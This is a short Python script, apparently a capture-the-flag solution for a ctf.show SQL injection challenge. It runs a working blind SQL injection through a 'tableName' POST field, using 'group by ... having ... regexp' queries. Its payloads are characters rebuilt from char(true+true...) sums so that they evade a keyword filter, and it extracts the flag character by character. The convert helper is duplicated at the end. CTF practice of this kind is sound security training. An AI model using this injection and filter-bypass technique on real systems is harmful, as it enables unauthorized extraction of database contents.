# author:yu22x
import requests
import string

url = "http://0f86850e-bec0-4342-a34c-ec950649ab33.challenge.ctf.show/select-waf.php"
s = '0123456789abcdef-{}'


def convert(strs):
    t = 'concat('
    for s in strs:
        t += 'char(true' + '+true' * (ord(s) - 1) + '),'
    return t[:-1] + ")"


flag = ''
for i in range(1, 45):
    # print(i)
    for j in s:
        d = convert(f'^ctfshow{flag + j}')
        data = {
            'tableName': f' ctfshow_user group by pass having pass regexp({d})'
        }
        print(data)
        r = requests.post(url, data=data)
        # print(r.text)
        if ("user_count = 1" in r.text):
            flag += j
            print(flag)
            if j == '}':
                exit(0)
            break


def convert(strs):
    t = 'concat('
    for s in strs:
        t += 'char(true' + '+true' * (ord(s) - 1) + '),'
    return t[:-1] + ")"
